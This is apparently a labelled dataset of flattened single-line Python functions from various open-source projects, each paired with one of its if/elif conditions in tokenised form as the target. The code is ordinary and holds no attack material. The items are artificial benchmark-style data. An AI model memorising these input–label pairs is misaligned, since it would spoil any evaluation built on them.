{"input": "def set_columns(worksheet, c, lengths): for col, j in enumerate(c): if j == \"Value\": j = \" \" * 18 if j == \"Description\": j = \"Descr\" lengths[col] = max(len(j) + 5, lengths[col]) worksheet.set_column(col, col, lengths[col])", "label": "if j == \"Description\" :"}
{"input": "def _remove_listners(self): object = self.object kids = self.children_cache for key, val in kids.items(): if isinstance(val, tvtk.Collection): vtk_obj = tvtk.to_vtk(val) messenger.disconnect(vtk_obj, \"ModifiedEvent\", self._notify_children) else: object.on_trait_change(self._notify_children, key, remove=True)", "label": "if isinstance ( val , tvtk . Collection ) :"}
{"input": "def add(self, undoinfo, msg=None): if not undoinfo: return if msg is not None: if isinstance(undoinfo[0], str): # replace message undoinfo = (msg,) + undoinfo[1:] elif isinstance(undoinfo, tuple): undoinfo = (msg,) + undoinfo else: undoinfo = (msg, undoinfo) f = 1 else: f = int(isinstance(undoinfo[0], str)) assert ( isinstance(undoinfo, list) or callable(undoinfo[f]) or isinstance(undoinfo[f], list) ) self.undoList.append(undoinfo) del self.redoList[:]", "label": "if isinstance ( undoinfo [ 0 ] , str ) :"}
{"input": "def assert_last_day(self, period_end): # 30 days has september, april, june and november if period_end.month in [9, 4, 6, 11]: self.assertEqual(period_end.day, 30) # all the rest have 31, except for february elif period_end.month != 2: self.assertEqual(period_end.day, 31) else: if calendar.isleap(period_end.year): self.assertEqual(period_end.day, 29) else: self.assertEqual(period_end.day, 28)", "label": "if calendar . isleap ( period_end . year ) :"}
{"input": "def remove_callback(self, callback, events=None): if events is None: for event in self._plugin_lifecycle_callbacks: if callback in self._plugin_lifecycle_callbacks[event]: self._plugin_lifecycle_callbacks[event].remove(callback) else: if isinstance(events, basestring): events = [events] for event in events: if callback in self._plugin_lifecycle_callbacks[event]: self._plugin_lifecycle_callbacks[event].remove(callback)", "label": "if isinstance ( events , basestring ) :"}
{"input": "def get_count(self, peek=False): if self.argument_supplied: count = self.argument_value if self.argument_negative: if count == 0: count = -1 else: count = -count if not peek: self.argument_negative = False if not peek: self.argument_supplied = False else: count = 1 return count", "label": "if count == 0 :"}
{"input": "def is_alive(self): if not self.runqemu: return False if os.path.isfile(self.qemu_pidfile): f = open(self.qemu_pidfile, \"r\") qemu_pid = f.read() f.close() qemupid = int(qemu_pid) if os.path.exists(\"/proc/\" + str(qemupid)): self.qemupid = qemupid return True return False", "label": "if os . path . exists ( \"/proc/\" + str ( qemupid ) ) :"}
{"input": "def contains(self, other_route): if isinstance(other_route, list): return self.to_list()[0 : len(other_route)] == other_route # This only works before merging assert len(other_route.outgoing) <= 1, \"contains(..) cannot be called after a merge\" assert len(self.outgoing) <= 1, \"contains(..) cannot be called after a merge\" if other_route.task_spec == self.task_spec: if other_route.outgoing and self.outgoing: return self.outgoing[0].contains(other_route.outgoing[0]) elif self.outgoing: return True elif not other_route.outgoing: return True return False", "label": "elif not other_route . outgoing :"}
{"input": "def _add_connection(self, connection, uri=None): with self._connections_lock: connection_id = connection.connection_id if connection_id not in self._connections: self._connections[connection_id] = ConnectionInfo( ConnectionType.OUTBOUND_CONNECTION, connection, uri, None, None )", "label": "if connection_id not in self . _connections :"}
{"input": "def view(input_path): if not exists(input_path): raise IOError(\"{0} not found\".format(input_path)) ua = None bundle_info = None try: archive = archive_factory(input_path) if archive is None: raise NotMatched(\"No matching archive type found\") ua = archive.unarchive_to_temp() bundle_info = ua.bundle.info finally: if ua is not None: ua.remove() return bundle_info", "label": "if ua is not None :"}
{"input": "def _expect_fail_and_reconnect(self, num_reconnects, fail_last=False): self._fake_backend.connect.expect_call(**_CONNECT_KWARGS).and_raises( FakeDatabaseError() ) for i in xrange(num_reconnects): time.sleep.expect_call(_RECONNECT_DELAY) if i < num_reconnects - 1: self._expect_reconnect(fail=True) else: self._expect_reconnect(fail=fail_last)", "label": "if i < num_reconnects - 1 :"}
{"input": "def _trigger_step(self): if self._enable_step: if self.local_step != self.trainer.steps_per_epoch - 1: # not the last step self._trigger() else: if not self._enable_epoch: self._trigger()", "label": "if not self . _enable_epoch :"}
{"input": "def draw_label(self): if self.hide: if not self.inputs[\"Seed\"].is_linked: seed = \" + ({0})\".format(str(int(self.seed))) else: seed = \" + seed(s)\" return self.noise_type.title() + seed else: return self.label or self.name", "label": "if not self . inputs [ \"Seed\" ] . is_linked :"}
{"input": "def get_adapter(self, pattern=None): adapters = self.get_adapters() if pattern is None: if len(adapters): return adapters[0] else: raise DBusNoSuchAdapterError(\"No adapter(s) found\") else: for adapter in adapters: path = adapter.get_object_path() if path.endswith(pattern) or adapter[\"Address\"] == pattern: return adapter raise DBusNoSuchAdapterError(\"No adapters found with pattern: %s\" % pattern)", "label": "if path . endswith ( pattern ) or adapter [ \"Address\" ] == pattern :"}
{"input": "def substituteargs(self, pattern, replacement, old): new = [] for k in range(len(replacement)): item = replacement[k] newitem = [item[0], item[1], item[2]] for i in range(3): if item[i] == \"*\": newitem[i] = old[k][i] elif item[i][:1] == \"$\": index = int(item[i][1:]) - 1 newitem[i] = old[index][i] new.append(tuple(newitem)) ##self.report(\"old: %r\", old) ##self.report(\"new: %r\", new) return new", "label": "if item [ i ] == \"*\" :"}
{"input": "def profiling_startup(): if \"--profile-sverchok-startup\" in sys.argv: global _profile_nesting profile = None try: profile = get_global_profile() _profile_nesting += 1 if _profile_nesting == 1: profile.enable() yield profile finally: _profile_nesting -= 1 if _profile_nesting == 0 and profile is not None: profile.disable() dump_stats(file_path=\"sverchok_profile.txt\") save_stats(\"sverchok_profile.prof\") else: yield None", "label": "if _profile_nesting == 0 and profile is not None :"}
{"input": "def align(size): if size <= 4096: # Small if is_power2(size): return size elif size < 128: return min_ge(range(16, 128 + 1, 16), size) elif size < 512: return min_ge(range(192, 512 + 1, 64), size) else: return min_ge(range(768, 4096 + 1, 256), size) elif size < 4194304: # Large return min_ge(range(4096, 4194304 + 1, 4096), size) else: # Huge return min_ge(range(4194304, 536870912 + 1, 4194304), size)", "label": "elif size < 512 :"}
{"input": "def _validate(self, event): new = self.value if new is not None and ( (self.start is not None and self.start > new) or (self.end is not None and self.end < new) ): value = datetime.strftime(new, self.format) start = datetime.strftime(self.start, self.format) end = datetime.strftime(self.end, self.format) if event: self.value = event.old raise ValueError( \"DatetimeInput value must be between {start} and {end}, \" \"supplied value is {value}\".format(start=start, end=end, value=value) )", "label": "if event :"}
{"input": "def parse(filename): dead_links = [] with open(filename, \"r\") as file_: for line in file_.readlines(): res = reference_line.search(line) if res: if not exists(res.group(1)): dead_links.append(res.group(1)) return dead_links", "label": "if not exists ( res . group ( 1 ) ) :"}
{"input": "def __getstate__(self): state = super(_GeneralExpressionDataImpl, self).__getstate__() for i in _GeneralExpressionDataImpl.__expression_slots__: state[i] = getattr(self, i) if safe_mode: state[\"_parent_expr\"] = None if self._parent_expr is not None: _parent_expr = self._parent_expr() if _parent_expr is not None: state[\"_parent_expr\"] = _parent_expr return state", "label": "if _parent_expr is not None :"}
{"input": "def insertText(self, data, parent=None): data = data if parent != self: _base.TreeBuilder.insertText(self, data, parent) else: # HACK: allow text nodes as children of the document node if hasattr(self.dom, \"_child_node_types\"): if Node.TEXT_NODE not in self.dom._child_node_types: self.dom._child_node_types = list(self.dom._child_node_types) self.dom._child_node_types.append(Node.TEXT_NODE) self.dom.appendChild(self.dom.createTextNode(data))", "label": "if Node . TEXT_NODE not in self . dom . _child_node_types :"}
{"input": "def main(args): from argparse import ArgumentParser from sys import stdin, stdout # TODO: Doc! argparser = ArgumentParser() argparser.add_argument(\"-u\", \"--unescape\", action=\"store_true\") argp = argparser.parse_args(args[1:]) for line in (l.rstrip(\"\\n\") for l in stdin): if argp.unescape: r = unescape(line) else: r = escape(line) stdout.write(r) stdout.write(\"\\n\")", "label": "if argp . unescape :"}
{"input": "def validate_user_json(value, json_schema): try: jsonschema.validate(value, from_json(json_schema)) except jsonschema.ValidationError as e: if len(e.path) > 1: raise InvalidModelValueError( \"For '{}' the field value {}\".format(e.path[-1], e.message) ) raise InvalidModelValueError(e.message) except jsonschema.SchemaError as e: raise InvalidModelValueError(e.message) validate_dates(value)", "label": "if len ( e . path ) > 1 :"}
{"input": "def test_mode(self): with support.temp_umask(0o002): base = support.TESTFN parent = os.path.join(base, \"dir1\") path = os.path.join(parent, \"dir2\") os.makedirs(path, 0o555) self.assertTrue(os.path.exists(path)) self.assertTrue(os.path.isdir(path)) if os.name != \"nt\": self.assertEqual(os.stat(path).st_mode & 0o777, 0o555) self.assertEqual(os.stat(parent).st_mode & 0o777, 0o775)", "label": "if os . name != \"nt\" :"}
{"input": "def __get_annotations(self): if not hasattr(self, \"_annotations\"): self._annotations = _retrieve_annotations( self._adaptor, self._primary_id, self._taxon_id ) if self._identifier: self._annotations[\"gi\"] = self._identifier if self._division: self._annotations[\"data_file_division\"] = self._division return self._annotations", "label": "if self . _identifier :"}
{"input": "def string(self): \"\"\"Returns a PlayString in string format from the Patterns values\"\"\" string = \"\" for item in self.data: if isinstance(item, (PGroup, GeneratorPattern)): string += item.string() elif isinstance(item, Pattern): string += ( \"(\" + \"\".join( [ (s.string() if hasattr(s, \"string\") else str(s)) for s in item.data ] ) + \")\" ) else: string += str(item) return string", "label": "if isinstance ( item , ( PGroup , GeneratorPattern ) ) :"}
{"input": "def __getattribute__(self, item): try: val = self[item] if isinstance(val, str): val = import_string(val) elif isinstance(val, (list, tuple)): val = [import_string(v) if isinstance(v, str) else v for v in val] self[item] = val except KeyError: val = super(ObjDict, self).__getattribute__(item) return val", "label": "if isinstance ( val , str ) :"}
{"input": "def get_identifiers(self): ids = [] ifaces = [i[\"name\"] for i in self.middleware.call_sync(\"interface.query\")] for entry in glob.glob(f\"{self._base_path}/interface-*\"): ident = entry.rsplit(\"-\", 1)[-1] if ident not in ifaces: continue if os.path.exists(os.path.join(entry, \"if_octets.rrd\")): ids.append(ident) ids.sort(key=RRDBase._sort_disks) return ids", "label": "if ident not in ifaces :"}
{"input": "def save_new_objects(self, commit=True): self.new_objects = [] for form in self.extra_forms: if not form.has_changed(): continue # If someone has marked an add form for deletion, don't save the # object. if self.can_delete and self._should_delete_form(form): continue self.new_objects.append(self.save_new(form, commit=commit)) if not commit: self.saved_forms.append(form) return self.new_objects", "label": "if self . can_delete and self . _should_delete_form ( form ) :"}
{"input": "def _get_seccomp_whitelist(self): whitelist = [False] * MAX_SYSCALL_NUMBER index = _SYSCALL_INDICIES[NATIVE_ABI] for i in range(SYSCALL_COUNT): # Ensure at least one syscall traps. # Otherwise, a simple assembly program could terminate without ever trapping. if i in (sys_exit, sys_exit_group): continue handler = self._security.get(i, DISALLOW) for call in translator[i][index]: if call is None: continue if isinstance(handler, int): whitelist[call] = handler == ALLOW return whitelist", "label": "if call is None :"}
{"input": "def start_check(aggregate, out): \"\"\"Start checking in background and write encoded output to out.\"\"\" # check in background t = threading.Thread(target=director.check_urls, args=(aggregate,)) t.start() # time to wait for new data sleep_seconds = 2 # current running time run_seconds = 0 while not aggregate.is_finished(): yield out.get_data() time.sleep(sleep_seconds) run_seconds += sleep_seconds if run_seconds > MAX_REQUEST_SECONDS: director.abort(aggregate) break yield out.get_data()", "label": "if run_seconds > MAX_REQUEST_SECONDS :"}
{"input": "def _prune_resource_identifiers(self, all_resources, all_operations): used_identifiers = self._get_identifiers_referenced_by_operations(all_operations) for resource, resource_data in list(all_resources.items()): identifiers = resource_data[\"resourceIdentifier\"] known_ids_for_resource = used_identifiers.get(resource, set()) for identifier_name in list(identifiers): if identifier_name not in known_ids_for_resource: del identifiers[identifier_name] if not identifiers: # If there's no identifiers used by an autocompletion # operation, then we don't need the resource. del all_resources[resource]", "label": "if identifier_name not in known_ids_for_resource :"}
{"input": "def has_valid_checksum(self, number): given_number, given_checksum = number[:-1], number[-1] calculated_checksum = 0 parameter = 7 for item in given_number: fragment = str(int(item) * parameter) if fragment.isalnum(): calculated_checksum += int(fragment[-1]) if parameter == 1: parameter = 7 elif parameter == 3: parameter = 1 elif parameter == 7: parameter = 3 return str(calculated_checksum)[-1] == given_checksum", "label": "if parameter == 1 :"}
{"input": "def _poll_until_not(url, pending_statuses, err_msg): while True: result, _, _ = _do_request(url, err_msg=err_msg) if result[\"status\"] in pending_statuses: time.sleep(2) continue return result", "label": "if result [ \"status\" ] in pending_statuses :"}
{"input": "def wrapper(request, *args, **kw): if switch_is_active(\"disable-bigquery\"): if kw.get(\"format\") == \"csv\": response = http.HttpResponse(content_type=\"text/csv; charset=utf-8\") else: response = http.HttpResponse(content_type=\"application/json\", content=\"[]\") response.status_code = 503 return response return f(request, *args, **kw)", "label": "if kw . get ( \"format\" ) == \"csv\" :"}
{"input": "def completion_safe_apply(ctx, f, args): from guild import config with config.SetGuildHome(ctx.parent.params.get(\"guild_home\")): try: return f(*args) except (Exception, SystemExit): if os.getenv(\"_GUILD_COMPLETE_DEBUG\") == \"1\": raise return None", "label": "if os . getenv ( \"_GUILD_COMPLETE_DEBUG\" ) == \"1\" :"}
{"input": "def configure(self, **kw): \"\"\"Configure the image.\"\"\" res = () for k, v in _cnfmerge(kw).items(): if v is not None: if k[-1] == \"_\": k = k[:-1] if hasattr(v, \"__call__\"): v = self._register(v) elif k in (\"data\", \"maskdata\"): v = self.tk._createbytearray(v) res = res + (\"-\" + k, v) self.tk.call((self.name, \"config\") + res)", "label": "if v is not None :"}
{"input": "def _editor_lower(self): editorWidget = main_container.MainContainer().get_actual_editor() if editorWidget: editorWidget.textCursor().beginEditBlock() if editorWidget.textCursor().hasSelection(): text = editorWidget.textCursor().selectedText().lower() else: text = editorWidget._text_under_cursor().lower() editorWidget.moveCursor(QTextCursor.StartOfWord) editorWidget.moveCursor(QTextCursor.EndOfWord, QTextCursor.KeepAnchor) editorWidget.textCursor().insertText(text) editorWidget.textCursor().endEditBlock()", "label": "if editorWidget . textCursor ( ) . hasSelection ( ) :"}
{"input": "def on_key_release(self, symbol, modifiers): if symbol == key.LEFT or symbol == key.RIGHT: self.value = not self.value self.text.text = self.get_label() self.toggle_func(self.value) if enable_sound: bullet_sound.play()", "label": "if enable_sound :"}
{"input": "def remove_checker(self, namespace, checker): for c in pyomo.core.check.ModelCheckRunner._checkers(all=True): if c._checkerName() == checker: if namespace.checkers.get(c._checkerPackage(), None) is not None: for i in range( namespace.checkers[c._checkerPackage()].count(c._checkerName()) ): namespace.checkers[c._checkerPackage()].remove(c._checkerName())", "label": "if c . _checkerName ( ) == checker :"}
{"input": "def find_executable(names): # Given a list of executable names, find the first one that is available # as an executable file, on the path. for name in names: fpath, fname = os.path.split(name) if fpath: # The given name is absolute. if is_executable(name): return name else: # Try to find the name on the PATH for path in os.environ[\"PATH\"].split(os.pathsep): exe_file = os.path.join(path, name) if is_executable(exe_file): return exe_file # Could not find it :( return None", "label": "if fpath :"}
{"input": "def run(self): while True: self.finished.wait(self.interval) if self.finished.isSet(): return try: self.function(*self.args, **self.kwargs) except Exception: if self.bus: self.bus.log( \"Error in perpetual timer thread function %r.\" % self.function, level=40, traceback=True, ) # Quit on first error to avoid massive logs. raise", "label": "if self . bus :"}
{"input": "def get_user_object(self, user_id, group): if user_id: user = OSFUser.load(user_id) if not user: raise exceptions.NotFound( detail=\"User with id {} not found.\".format(user_id) ) if group.has_permission(user, \"member\"): raise exceptions.ValidationError( detail=\"User is already a member of this group.\" ) return user return user_id", "label": "if group . has_permission ( user , \"member\" ) :"}
{"input": "def build_term_table(spec): try: return _term_tables_cache[spec] except KeyError: tbl = {} terms = {} i = 0 for t in spec: which = terms.setdefault(t, 0) tbl[t, which] = i tbl[\"%s_%d\" % (t, which)] = i if which == 0: tbl[t] = i terms[t] += 1 i += 1 _term_tables_cache[spec] = tbl return tbl", "label": "if which == 0 :"}
{"input": "def GetQualifiedWsdlName(type): with _lazyLock: wsdlNSAndName = _wsdlNameMap.get(type) if wsdlNSAndName: return wsdlNSAndName else: if issubclass(type, list): ns = GetWsdlNamespace(type.Item._version) return (ns, \"ArrayOf\" + Capitalize(type.Item._wsdlName)) else: ns = GetWsdlNamespace(type._version) return (ns, type._wsdlName)", "label": "if issubclass ( type , list ) :"}
{"input": "def train(config, checkpoint_dir=None): restored = bool(checkpoint_dir) itr = 0 if checkpoint_dir: with open(os.path.join(checkpoint_dir, \"ckpt.log\"), \"r\") as f: itr = int(f.read()) + 1 for i in range(itr, 10): if i == 5 and not restored: raise Exception(\"try to fail me\") with tune.checkpoint_dir(step=itr) as checkpoint_dir: checkpoint_path = os.path.join(checkpoint_dir, \"ckpt.log\") with open(checkpoint_path, \"w\") as f: f.write(str(i)) tune.report(test=i, training_iteration=i)", "label": "if i == 5 and not restored :"}
{"input": "def _process_events(self, event_list): for key, mask in event_list: fileobj, (reader, writer) = key.fileobj, key.data if mask & selectors.EVENT_READ and reader is not None: if reader._cancelled: self.remove_reader(fileobj) else: self._add_callback(reader) if mask & selectors.EVENT_WRITE and writer is not None: if writer._cancelled: self.remove_writer(fileobj) else: self._add_callback(writer)", "label": "if writer . _cancelled :"}
{"input": "def _validate_mappings(self): # Validate mapping references for m in self.mapping.mapping_rules: for policy_id in m.policy_ids: if policy_id not in self.policies: raise ReferencedObjectNotFoundError( reference_id=policy_id, reference_type=\"policy\" ) for w in m.whitelist_ids: if w not in self.whitelists: raise ReferencedObjectNotFoundError( reference_id=w, reference_type=\"whitelist\" )", "label": "if w not in self . whitelists :"}
{"input": "def _transform_backward(graph, op): no_dequanted_input_vars = True for var_node in op.inputs: if var_node.name() in dequantized_vars: dequant_var_node = dequantized_vars[var_node.name()] graph.update_input_link(var_node, dequant_var_node, op) no_dequanted_input_vars = False if no_dequanted_input_vars: raise ValueError(\"There is no dequanted inputs for op %s.\" % (op.name()))", "label": "if var_node . name ( ) in dequantized_vars :"}
{"input": "def should_use_pty(self, pty=False, fallback=True): use_pty = False if pty: use_pty = True # TODO: pass in & test in_stream, not sys.stdin if not has_fileno(sys.stdin) and fallback: if not self.warned_about_pty_fallback: err = \"WARNING: stdin has no fileno; falling back to non-pty execution!\\n\" # noqa sys.stderr.write(err) self.warned_about_pty_fallback = True use_pty = False return use_pty", "label": "if not has_fileno ( sys . stdin ) and fallback :"}
{"input": "def _get_default_factory(self, attribute_name: str) -> Any: if hasattr(self, attribute_name): if str(getattr(self, attribute_name)).startswith(\"${\"): return str(getattr(self, attribute_name)) elif str(self.__dataclass_fields__[attribute_name].default).startswith(\"${\"): return str(self.__dataclass_fields__[attribute_name].default) elif ( getattr(self, attribute_name) != self.__dataclass_fields__[attribute_name].default_factory() ): return getattr(self, attribute_name) return self.__dataclass_fields__[attribute_name].default_factory()", "label": "if str ( getattr ( self , attribute_name ) ) . startswith ( \"${\" ) :"}
{"input": "def create_row_processor( self, context, path, loadopt, mapper, result, adapter, populators ): # look through list of columns represented here # to see which, if any, is present in the row. for col in self.columns: if adapter: col = adapter.columns[col] getter = result._getter(col, False) if getter: populators[\"quick\"].append((self.key, getter)) break else: populators[\"expire\"].append((self.key, True))", "label": "if adapter :"}
{"input": "def test_finds_multiple_songs(self): for _, album in albums_in_dir(self.base): n = re.search(br\"album(.)song\", album[0]).group(1) if n == b\"1\": self.assertEqual(len(album), 2) else: self.assertEqual(len(album), 1)", "label": "if n == b\"1\" :"}
{"input": "def _should_update_cache(self, request, response): if not hasattr(request, \"_cache_update_cache\") or not request._cache_update_cache: return False if self.cache_anonymous_only and has_vary_header(response, \"Cookie\"): assert hasattr( request, \"user\" ), \"The Django cache middleware with CACHE_MIDDLEWARE_ANONYMOUS_ONLY=True requires authentication middleware to be installed. Edit your MIDDLEWARE_CLASSES setting to insert 'django.contrib.auth.middleware.AuthenticationMiddleware' before the CacheMiddleware.\" if request.user.is_authenticated(): # Don't cache user-variable requests from authenticated users. return False return True", "label": "if request . user . is_authenticated ( ) :"}
{"input": "def break_next_call(symbol_regex=None): while pwndbg.proc.alive: ins = break_next_branch() if not ins: break # continue if not a call if capstone.CS_GRP_CALL not in ins.groups: continue # return call if we don't search for a symbol if not symbol_regex: return ins # return call if we match target address if ins.target_const and re.match(\"%s$\" % symbol_regex, hex(ins.target)): return ins # return call if we match symbol name if ins.symbol and re.match(\"%s$\" % symbol_regex, ins.symbol): return ins", "label": "if not ins :"}
{"input": "def parser(cls, buf, offset): type_, len_, vendor = struct.unpack_from( ofproto.OFP_ACTION_VENDOR_HEADER_PACK_STR, buf, offset ) data = buf[(offset + ofproto.OFP_ACTION_VENDOR_HEADER_SIZE) : offset + len_] if vendor == ofproto_common.NX_EXPERIMENTER_ID: obj = NXAction.parse(data) # noqa else: cls_ = cls._ACTION_VENDORS.get(vendor, None) if cls_ is None: obj = OFPActionVendorUnknown(vendor, data) else: obj = cls_.parser(buf, offset) obj.len = len_ return obj", "label": "if cls_ is None :"}
{"input": "def remove_empty_files(root_path): \"\"\"Removes empty files in a path recursively\"\"\" for directory, _, filenames in walk(root_path): for filename in filenames: path = os.path.join(directory, filename) if os.path.getsize(path) > 0: continue try: os.remove(path) except: logs.log_error( \"Unable to remove the empty file: %s (%s).\" % (path, sys.exc_info()[0]) )", "label": "if os . path . getsize ( path ) > 0 :"}
{"input": "def _test_set_ipv4_src(self, ip, mask=None): header = ofproto.OXM_OF_IPV4_SRC match = OFPMatch() ip = unpack(\"!I\", socket.inet_aton(ip))[0] if mask is None: match.set_ipv4_src(ip) else: mask = unpack(\"!I\", socket.inet_aton(mask))[0] if (mask + 1) >> 32 != 1: header = ofproto.OXM_OF_IPV4_SRC_W match.set_ipv4_src_masked(ip, mask) self._test_serialize_and_parser(match, header, ip, mask)", "label": "if ( mask + 1 ) >> 32 != 1 :"}
{"input": "def is_valid_block(self): \"\"\"check wheter the block is valid in the current position\"\"\" for i in range(self.block.x): for j in range(self.block.x): if self.block.get(i, j): if self.block.pos.x + i < 0: return False if self.block.pos.x + i >= COLUMNS: return False if self.block.pos.y + j < 0: return False if self.map.get((self.block.pos.x + i, self.block.pos.y + j), False): return False return True", "label": "if self . map . get ( ( self . block . pos . x + i , self . block . pos . y + j ) , False ) :"}
{"input": "def __init__(self, *args, **kwargs): dict.__init__(self, *args, **kwargs) for key, value in self.items(): if not isinstance(key, string_types): raise TypeError(\"key must be a str, not {}\".format(type(key))) if not isinstance(value, NUMERIC_TYPES): raise TypeError(\"value must be a NUMERIC_TYPES, not {}\".format(type(value))) if not isinstance(value, float): self[key] = float(value)", "label": "if not isinstance ( key , string_types ) :"}
{"input": "def refresh_committed_offsets_if_needed(self): \"\"\"Fetch committed offsets for assigned partitions.\"\"\" if self._subscription.needs_fetch_committed_offsets: offsets = self.fetch_committed_offsets(self._subscription.assigned_partitions()) for partition, offset in six.iteritems(offsets): # verify assignment is still active if self._subscription.is_assigned(partition): self._subscription.assignment[partition].committed = offset.offset self._subscription.needs_fetch_committed_offsets = False", "label": "if self . _subscription . is_assigned ( partition ) :"}
{"input": "def getText(self, stuff): if isinstance(stuff, BaseWrapper): stuff = stuff.item if isinstance(stuff, (Fit, TargetProfile)): val, unit = self._getValue(stuff) if val is None: return \"\" # Stick to value - 25k GJ if self.stickPrefixToValue: return \"{} {}\".format(formatAmount(val, *self.formatSpec), unit) # Stick to unit - 25 km else: return formatAmount(val, *self.formatSpec, unitName=unit) return \"\"", "label": "if val is None :"}
{"input": "def __get__(self, inst, owner): try: value, last_update = inst._cache[self.__name__] if self.ttl > 0 and time.time() - last_update > self.ttl: raise AttributeError except (KeyError, AttributeError): value = self.fget(inst) try: cache = inst._cache except AttributeError: cache = inst._cache = {} cache[self.__name__] = (value, time.time()) return value", "label": "if self . ttl > 0 and time . time ( ) - last_update > self . ttl :"}
{"input": "def on_event_clicked(self, widget, event): if event.type == Gdk.EventType.BUTTON_PRESS and event.button == 3: path = self.get_path_at_pos(int(event.x), int(event.y)) if path is not None: row = self.get(path[0], \"device\") if row: if self.Blueman is not None: if self.menu is None: self.menu = ManagerDeviceMenu(self.Blueman) self.menu.popup(None, None, None, None, event.button, event.time)", "label": "if path is not None :"}
{"input": "def groups(self): \"\"\"Return a dictionary mapping group names to JIDs.\"\"\" result = {} for jid in self._jids: groups = self._jids[jid][\"groups\"] if not groups: if \"\" not in result: result[\"\"] = [] result[\"\"].append(jid) for group in groups: if group not in result: result[group] = [] result[group].append(jid) return result", "label": "if not groups :"}
{"input": "def set_meta(self, dataset, overwrite=True, **kwd): super().set_meta(dataset, overwrite=overwrite, **kwd) try: conn = sqlite.connect(dataset.file_name) c = conn.cursor() version_query = \"SELECT version FROM meta\" results = c.execute(version_query).fetchall() if len(results) == 0: raise Exception(\"version not found in meta table\") elif len(results) > 1: raise Exception(\"Multiple versions found in meta table\") dataset.metadata.gafa_schema_version = results[0][0] except Exception as e: log.warning(\"%s, set_meta Exception: %s\", self, e)", "label": "elif len ( results ) > 1 :"}
{"input": "def GetSelectedCount(self): if self.GetStyleL(\"style\") & self.Style.LBS_MULTIPLESEL: return self.SendMessage(self.Hwnd, self.Msg.LB_GETSELCOUNT, 0, 0) else: result = self.SendMessage(self.Hwnd, self.Msg.LB_GETCURSEL, 0, 0) if result == LB_ERR: return 0 return 1", "label": "if result == LB_ERR :"}
{"input": "def emit(self, record): try: item = QListWidgetItem(self.format(record)) if record.levelno > logging.INFO: item.setIcon(QIcon.fromTheme(\"dialog-warning\")) item.setForeground(QBrush(Qt.red)) else: item.setIcon(QIcon.fromTheme(\"dialog-information\")) self.app.exec_in_main(self._add_item, item) except (KeyboardInterrupt, SystemExit): raise except: self.handleError(record)", "label": "if record . levelno > logging . INFO :"}
{"input": "def _updater(data): assert data[\"attrs\"][\"tvm_version\"].startswith(from_ver) nodes = data[\"nodes\"] for idx, item in enumerate(nodes): f = node_map.get(item[\"type_key\"], None) if isinstance(f, list): for fpass in f: item = fpass(item, nodes) elif f: item = f(item, nodes) nodes[idx] = item data[\"attrs\"][\"tvm_version\"] = to_ver return data", "label": "if isinstance ( f , list ) :"}
{"input": "def remove_data(self): if self.path is not None: if os.path.exists(self.path): os.remove(self.path) if os.path.exists(self.get_json_path()): os.remove(self.get_json_path())", "label": "if os . path . exists ( self . path ) :"}
{"input": "def testsingle(self, sym): if self.settings == \"asterisk\": return (sym == \"*\", \"*\") if self.settings == \"plus\": return (sym == \"+\", \"+\") if self.settings == \"dash\": return (sym == \"-\", \"-\") if self.settings == \"single\": if self.lastSym: return (self.lastSym == sym, self.lastSym) else: self.lastSym = sym return (True, None) return (None, None)", "label": "if self . lastSym :"}
{"input": "def update(self, other_dict, option_parser): if isinstance(other_dict, Values): other_dict = other_dict.__dict__ other_dict = other_dict.copy() for setting in option_parser.lists.keys(): if hasattr(self, setting) and setting in other_dict: value = getattr(self, setting) if value: value += other_dict[setting] del other_dict[setting] self._update_loose(other_dict)", "label": "if hasattr ( self , setting ) and setting in other_dict :"}
{"input": "def gprv_immv(ii): for i, op in enumerate(_gen_opnds(ii)): if i == 0: if op.name == \"REG0\" and op_luf_start(op, \"GPRv\"): continue else: return False elif i == 1: if op_immv(op): continue else: return False else: return False return True", "label": "if op . name == \"REG0\" and op_luf_start ( op , \"GPRv\" ) :"}
{"input": "def __call__(self, input_tensors, shape): if self.order in \"KA\": if any(t.order == TensorOrder.C_ORDER for t in input_tensors): order = TensorOrder.C_ORDER else: order = TensorOrder.F_ORDER else: if self.order == \"C\": order = TensorOrder.C_ORDER else: order = TensorOrder.F_ORDER return self.new_tensor(input_tensors, shape=shape, dtype=self.dtype, order=order)", "label": "if any ( t . order == TensorOrder . C_ORDER for t in input_tensors ) :"}
{"input": "def check_selected(menu, path): selected = False if \"url\" in menu: chop_index = menu[\"url\"].find(\"?\") if chop_index == -1: selected = path.startswith(menu[\"url\"]) else: selected = path.startswith(menu[\"url\"][:chop_index]) if \"menus\" in menu: for m in menu[\"menus\"]: _s = check_selected(m, path) if _s: selected = True if selected: menu[\"selected\"] = True return selected", "label": "if chop_index == - 1 :"}
{"input": "def _check_events(self): # make sure song-started and song-ended match up stack = [] old = self.events[:] for type_, song in self.events: if type_ == \"started\": stack.append(song) elif type_ == \"ended\": self.assertTrue(stack.pop(-1) is song, msg=old) self.assertFalse(stack, msg=old)", "label": "elif type_ == \"ended\" :"}
{"input": "def __fixdict(self, dict): for key in dict.keys(): if key[:6] == \"start_\": tag = key[6:] start, end = self.elements.get(tag, (None, None)) if start is None: self.elements[tag] = getattr(self, key), end elif key[:4] == \"end_\": tag = key[4:] start, end = self.elements.get(tag, (None, None)) if end is None: self.elements[tag] = start, getattr(self, key)", "label": "elif key [ : 4 ] == \"end_\" :"}
{"input": "def nested_match(expect, value): if expect == value: return True if isinstance(expect, dict) and isinstance(value, dict): for k, v in expect.items(): if k in value: if not nested_match(v, value[k]): return False else: return False return True if isinstance(expect, list) and isinstance(value, list): for x, y in zip(expect, value): if not nested_match(x, y): return False return True return False", "label": "if k in value :"}
{"input": "def code_match(code, select, ignore): if ignore: assert not isinstance(ignore, unicode) for ignored_code in [c.strip() for c in ignore]: if mutual_startswith(code.lower(), ignored_code.lower()): return False if select: assert not isinstance(select, unicode) for selected_code in [c.strip() for c in select]: if mutual_startswith(code.lower(), selected_code.lower()): return True return False return True", "label": "if mutual_startswith ( code . lower ( ) , ignored_code . lower ( ) ) :"}
{"input": "def test_cardinality_m2o(self): m2o_type_fields = [ f for f in self.fields_and_reverse_objects if f.is_relation and f.many_to_one ] # Test classes are what we expect self.assertEqual(MANY_TO_ONE_CLASSES, {f.__class__ for f in m2o_type_fields}) # Ensure all m2o reverses are o2m for obj in m2o_type_fields: if hasattr(obj, \"field\"): reverse_field = obj.field self.assertTrue(reverse_field.is_relation and reverse_field.one_to_many)", "label": "if hasattr ( obj , \"field\" ) :"}
